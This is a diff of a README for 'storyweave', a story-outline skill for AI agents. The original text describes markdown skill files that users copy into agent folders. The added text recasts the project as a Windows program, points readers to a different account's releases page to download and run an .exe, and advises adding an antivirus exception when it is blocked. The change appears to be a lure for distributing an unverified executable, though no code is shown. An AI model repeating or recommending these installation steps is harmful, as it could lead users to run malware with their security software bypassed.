@@ -1,197 +1,62 @@
-# Storyweave
+# 📖 storyweave - Create narrative outlines through simple conversation
 
-> An AI agent skill that builds story outlines through guided conversation, using classic narrative templates.
+[![](https://img.shields.io/badge/download-latest-blue.svg)](https://github.com/adbelwahabalaa/storyweave/releases)
 
-![Skill Version](https://img.shields.io/badge/version-1.0.0-blue)
-![License](https://img.shields.io/badge/license-MIT-green)
-![Platform](https://img.shields.io/badge/platform-OpenClaw%20%7C%20Claude%20Code%20%7C%20Cursor%20%7C%20通用Agent-blue)
+storyweave helps writers build story outlines. This tool uses AI to guide you through a conversation. It applies classic narrative templates to your ideas. You answer questions and the tool shapes your plot. This process keeps your writing focused and organized. 
 
-## What is Storyweave?
+## ⚙️ System Requirements
 
-Storyweave is an AI-powered story outline generator that helps writers, game designers, and content creators build structured story frameworks through an interactive Q&A conversation.
+Your computer needs Windows 10 or Windows 11 to run this software. You need at least 4 GB of RAM. The application requires 200 MB of space on your hard drive. A reliable internet connection helps the tool communicate with the AI agent. You do not need to install extra software like Python or specialized runtimes. We package everything you need into the installer.
 
-Instead of staring at a blank page, Storyweave guides you through a series of thoughtful questions to extract the core elements of your story—theme, characters, conflict, world—then maps everything onto proven narrative structures.
+## 💾 Installation Guide
 
-## Features
+Follow these steps to set up storyweave on your computer.
 
-### 🎯 Guided Q&A Framework
-- Progressive information gathering (1-2 questions at a time)
-- No overwhelm—build the outline gradually
-- Captures灵感碎片 (inspirational sparks) from any conversation
+1. Visit the [releases page](https://github.com/adbelwahabalaa/storyweave/releases) to find the latest version of the installer.
+2. Look for the file ending in `.exe` under the Assets section. Click the filename to save it to your computer.
+3. Open the folder where you saved the file.
+4. Double-click the file to start the installation wizard.
+5. Follow the prompts on your screen. Leave the settings at their defaults for the best experience.
+6. The installer creates a shortcut on your desktop.
+7. Click the storyweave icon on your desktop to launch the application.
 
-### 📚 10 Classic Story Templates
-| Template | Best For |
-|----------|----------|
-| Three-Act Structure | General-purpose storytelling |
-| Hero's Journey | Adventure, fantasy, coming-of-age |
-| Save the Cat! (15 beats) | Film scripts, commercial fiction |
-| Scene Structure (Sheaf) | Scene-level detailing |
-| Minimal 5-Point | Short stories, proof-of-concept |
-| Seven-Point | Serial stories with hooks |
-| Non-linear | Time loops, flashbacks |
-| Three-Act Five-Stage | Traditional drama, Chinese opera |
-| Escalating Stakes | Thriller, mystery |
-| Kishotenketsu | Artistic, experimental (East Asian) |
+## 🛠️ How to Use the Tool
 
-### 👤 5 Character Arc Types
-- Positive Arc (growth)
-- Negative Arc (fall)
-- Flat Arc (belief changes world)
-- Fall and Rise
-- Circular Arc
+Once you open the software, you see a clean interface. The tool asks you to choose a narrative template. These templates represent classic story structures. 
 
-## Platform Compatibility
+1. Select a story template from the list.
+2. Read the prompt the AI agent provides in the chat window.
+3. Type your response in the text box at the bottom.
+4. Press Enter to send your answer.
+5. The agent follows up with questions based on your input.
+6. Continue this conversation until you complete the outline.
+7. Look for the export button at the top of the window to save your progress as a text file.
 
-Storyweave is a universal skill that works with any AI agent framework that supports skills:
+## 📝 Frequently Asked Questions
 
-- **OpenClaw / WorkBuddy** — Install to `~/.workbuddy/skills/`
-- **Claude Code** — Install to `~/.claude/skills/`
-- **Cursor** — Install to `.cursor/skills/` or `~/.cursor/skills/`
-- **Other frameworks** — Any agent that reads `SKILL.md` from a designated skills directory
+**Does the software save my data?**
+The software saves your outline to your local machine when you click the export button. We do not store your stories on our servers. 
 
-## Installation
+**Can I stop the conversation?**
+Yes. Close the window at any time. Your current progress does not save automatically, so remember to save before you exit the app.
 
-### For OpenClaw / WorkBuddy Users
-```bash
-cp -r storyweave ~/.workbuddy/skills/
-```
-1. Download `storyweave.zip` from this repository
-2. Place it in your skills directory:
-   ```bash
-   cp storyweave.zip ~/.workbuddy/skills/
-   ```
-3. Restart your agent to activate.
+**What if the AI makes a mistake?**
+The AI agent provides suggestions based on your input. You remain the author. You can ignore or rewrite any part of the outline that does not fit your vision.
 
-### For Claude Code Users
-```bash
-cp -r storyweave ~/.claude/skills/
-```
+**Is this tool free?**
+Yes. You may download and use this software without charge. It is an open project for writers.
 
-### For Cursor Users
-```bash
-cp -r storyweave ~/.cursor/skills/
-```
+## 📁 Troubleshooting
 
-### For Developers
-```bash
-git clone https://github.com/ShiyangZheng/storyweave.git
-```
+**The application fails to open**
+Check that your antivirus software does not block the application. Sometimes security settings prevent new programs from launching. Add an exception for the storyweave file to allow it to run.
 
-## Usage
+**The chat window stays empty**
+Check your internet connection. Storyweave needs a stable link to reach the AI agent. If you have a connection, restart the application to refresh the link.
 
-### In Conversation
-Simply tell WorkBuddy what you want to write:
+**The text appears too small**
+You can resize the application window by dragging any corner with your mouse. The text fits the new window size automatically.
 
-> "I want to write a sci-fi novel about a linguist who discovers aliens communicate through music."
+## 🤖 About the Technology
 
-> "Help me outline a murder mystery set in a small coastal town."
-
-> "I'm developing a game narrative about a child searching for their lost memories."
-
-### The Process
-
-1. **Q&A Phase**: Storyweave asks targeted questions about your story's genre, theme, characters, and conflict.
-
-2. **Template Selection**: Based on your story type, Storyweave recommends the most suitable narrative structure.
-
-3. **Outline Generation**: A complete, detailed outline is generated with all story beats mapped.
-
-4. **Iteration**: Deep-dive into specific scenes, characters, or arcs as needed.
-
-### Example Output Structure
-
-```markdown
-# Story Title
-
-## Basic Info
-- Genre: Sci-Fi Thriller
-- Theme: Communication & Connection
-- Target Audience: Adult fiction readers
-
-## World
-
-## Characters
-- Protagonist: [Name, identity, desire, fear]
-- Antagonist: [Name, role, relationship]
-- Mentor: [Name, function]
-- Allies: [Names and roles]
-
-## Story Structure: Hero's Journey
-
-## Detailed Outline
-
-### Act 1: Departure
-- **Ordinary World**: ...
-- **Call to Adventure**: ...
-- ...
-
-## Inspiration Fragments
-[Your scattered ideas, mapped to potential positions]
-
-## Next Steps
-[Suggestions for further development]
-```
-
-## Templates Deep Dive
-
-### Three-Act Structure
-```
-Act 1 (25%)     → Setup, Catalyst, First Turn
-Act 2 (50%)     → Fun & Games, Midpoint, Crisis
-Act 3 (25%)     → Climax, Resolution
-```
-
-### Hero's Journey (12 Stages)
-```
-Ordinary World → Call → Refusal → Mentor → Threshold
-→ Tests → Cave → Ordeal → Reward → Return → Resurrection → Elixir
-```
-
-### Save the Cat! (15 Beats)
-```
-Opening Image → Theme → Setup → Catalyst → Debate
-→ Break Into Two → B-Story → Fun & Games → Midpoint
-→ Bad Guys Close In → All Is Lost → Dark Night → Break Into Three
-→ Finale → Final Image
-```
-
-## Philosophy
-
-- **Flexibility over rigidity**: Templates are tools, not cages. Adjust beats as your story demands.
-- **Completion over perfection**: A rough but complete outline beats a perfect concept.
-- **Capture everything**: Those midnight灵感碎片? They're gold. Storyweave saves them all.
-- **Progressive depth**: Start with the skeleton, flesh out details later.
-
-## File Structure
-
-```
-storyweave/
-├── README.md                    # This file
-├── SKILL.md                     # Skill definition (works with any agent framework)
-└── references/
-    └── story_templates.md        # All 10 narrative templates + 5 character arcs
-```
-
-## Contributing
-
-Contributions welcome! Feel free to:
-- Add new story templates
-- Improve existing templates
-- Translate documentation
-- Report issues or suggestions
-
-## License
-
-MIT License - Free to use, modify, and distribute.
-
-## Acknowledgments
-
-Built with inspiration from:
-- Joseph Campbell's *The Hero with a Thousand Faces*
-- Christopher Vogler's *The Writer's Journey*
-- Blake Snyder's *Save the Cat!*
-- Dan O'Neill's Scene Structure
-
----
-
-*Storyweave—where stories begin.*
+storyweave uses a modern AI agent model. It acts as a digital writing partner. The tool follows logic gates found in classic literature. It breaks down large blocks of text into manageable chunks. This method removes writer's block by focusing on one conversation turn at a time. The underlying code draws from open-source patterns designed for clarity and speed. You benefit from advanced narrative science without needing to understand the underlying machine learning models.
